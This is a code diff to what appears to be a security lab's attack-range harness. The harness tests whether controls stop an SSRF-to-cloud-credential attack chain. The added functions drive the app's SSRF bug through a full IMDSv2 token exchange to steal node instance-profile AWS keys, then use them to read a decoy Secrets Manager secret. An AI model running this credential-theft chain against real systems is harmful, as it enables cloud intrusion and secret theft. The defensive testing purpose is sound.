@@ -40,6 +40,12 @@ NS = "summarizer"
 SA = f"system:serviceaccount:{NS}:{NS}"
 IMDS = "169.254.169.254"
 
+# Stage 3's actual pivot target: the lab's decoy prod secret, scoped to this
+# cluster's name so the node-pivot IAM policy's resource wildcard covers it
+# (see infra/node-iam.tf). Override LOOT_SECRET_ID if cluster_name was changed.
+LOOT_SECRET_ID = os.environ.get("LOOT_SECRET_ID", "attack-range/prod/db-backup")
+AWS_REGION = os.environ.get("AWS_REGION", os.environ.get("AWS_DEFAULT_REGION", "us-east-1"))
+
 EXPLOITED, BLOCKED, ERROR, INFO = "exploited", "blocked", "error", "info"
 
 # One row per stage: id, name, and the control layer that is meant to stop it.
@@ -102,13 +108,16 @@ def classify_secret_trophy(can_get: bool | None, secret_exists: bool | None) -> 
     return BLOCKED
 
 
-def classify_lateral(creds_available: bool, could_read: bool | None) -> str:
+def classify_lateral(creds_stolen: bool, could_read: bool | None) -> str:
     """Stage 3. Needs stolen node creds; without them the control is not exercised."""
-    if not creds_available:
-        # Upstream (SSRF/hop-limit) held, so no node creds. Honestly an error for
-        # THIS control: it was not exercised, so we do not claim it as blocked.
+    if not creds_stolen:
+        # Upstream (SSRF/hop-limit) held, or the IMDSv2 steal itself failed, so
+        # there are no node creds to pivot with. Honestly an error for THIS
+        # control: it was not exercised, so we do not claim it as blocked.
         return ERROR
     if could_read is None:
+        # Creds were stolen but the pivot attempt itself could not be evaluated
+        # (e.g. the aws CLI is missing or timed out). Collection gap, not a verdict.
         return ERROR
     return EXPLOITED if could_read else BLOCKED
 
@@ -165,6 +174,77 @@ def _can_i(verb: str, resource: str, extra: list[str] | None = None) -> bool | N
     return None
 
 
+def _ssrf_fetch(app_url: str, url: str, method: str = "GET",
+                 headers: dict | None = None) -> str | None:
+    """Drive the app's SSRF bug (stage 2) to fetch an arbitrary URL server-side.
+    Returns the fetched body, or None if the request itself failed (non-200,
+    bad JSON, or the hardened app with no url field)."""
+    payload = json.dumps({"url": url, "method": method, "headers": headers or {}}).encode()
+    code, body = _http(f"{app_url}/summarize", method="POST", body=payload,
+                        headers={"content-type": "application/json"})
+    if code != 200:
+        return None
+    try:
+        data = json.loads(body)
+    except Exception:  # noqa: BLE001
+        return None
+    return data.get("body")
+
+
+def _steal_node_credentials(app_url: str) -> dict | None:
+    """Stage 3's actual theft: do the full IMDSv2 token dance through the app's
+    SSRF bug and come back with the node instance-profile's AccessKeyId,
+    SecretAccessKey and Token. Returns None if any hop fails (hardened app has
+    no url field, or the IMDSv2-only/hop-limit posture blocks the fetch)."""
+    token = _ssrf_fetch(app_url, f"http://{IMDS}/latest/api/token", method="PUT",
+                         headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"})
+    if not token:
+        return None
+    token = token.strip()
+    role = _ssrf_fetch(app_url, f"http://{IMDS}/latest/meta-data/iam/security-credentials/",
+                        headers={"X-aws-ec2-metadata-token": token})
+    if not role:
+        return None
+    role = role.strip().splitlines()[0]
+    creds_body = _ssrf_fetch(
+        app_url, f"http://{IMDS}/latest/meta-data/iam/security-credentials/{role}",
+        headers={"X-aws-ec2-metadata-token": token})
+    if not creds_body:
+        return None
+    try:
+        creds = json.loads(creds_body)
+    except Exception:  # noqa: BLE001
+        return None
+    if "AccessKeyId" not in creds or "SecretAccessKey" not in creds:
+        return None
+    return creds
+
+
+def _pivot_read_loot(creds: dict) -> bool | None:
+    """Use the stolen node creds to attempt the lateral-movement read this
+    control is meant to stop: the lab's decoy prod secret, which the summarizer
+    app's own identity never had access to. Returns True if read, False if
+    denied (the control holds), None if the attempt itself could not be
+    evaluated (collection gap, e.g. no aws CLI), never a verdict in that case."""
+    env = dict(os.environ)
+    env["AWS_ACCESS_KEY_ID"] = creds["AccessKeyId"]
+    env["AWS_SECRET_ACCESS_KEY"] = creds["SecretAccessKey"]
+    if creds.get("Token"):
+        env["AWS_SESSION_TOKEN"] = creds["Token"]
+    env["AWS_REGION"] = AWS_REGION
+    cmd = ["aws", "secretsmanager", "get-secret-value", "--secret-id", LOOT_SECRET_ID,
+           "--query", "Name", "--output", "text"]
+    try:
+        r = subprocess.run(cmd, capture_output=True, text=True, timeout=20, env=env)
+    except Exception:  # noqa: BLE001
+        return None
+    if r.returncode == 0:
+        return True
+    if "AccessDenied" in r.stderr:
+        return False
+    return None
+
+
 def _secret_exists() -> bool | None:
     try:
         r = subprocess.run(
@@ -208,9 +288,18 @@ def run_stages(app_url: str) -> dict:
     creds_available = results["2"]["status"] == EXPLOITED
 
     # Stage 3: lateral movement with node creds. Only exercisable if stage 2 won.
-    results["3"] = {"status": classify_lateral(creds_available, None),
-                    "detail": "needs stolen node creds" if not creds_available
-                    else "node creds obtained"}
+    # Steal the real node instance-profile creds via the same SSRF bug, then try
+    # the actual pivot read on the lab's decoy secret, not a stand-in.
+    node_creds = _steal_node_credentials(app_url) if creds_available else None
+    could_read = _pivot_read_loot(node_creds) if node_creds else None
+    if not creds_available:
+        detail = "needs stolen node creds"
+    elif node_creds is None:
+        detail = "stage 2 won but the IMDSv2 credential steal failed"
+    else:
+        detail = f"stole node role creds, pivot read of {LOOT_SECRET_ID}: {could_read}"
+    results["3"] = {"status": classify_lateral(node_creds is not None, could_read),
+                    "detail": detail}
 
     # Stage 4: privilege escalation — can the app SA list secrets cluster-wide?
     allowed = _can_i("list", "secrets", ["--all-namespaces"])
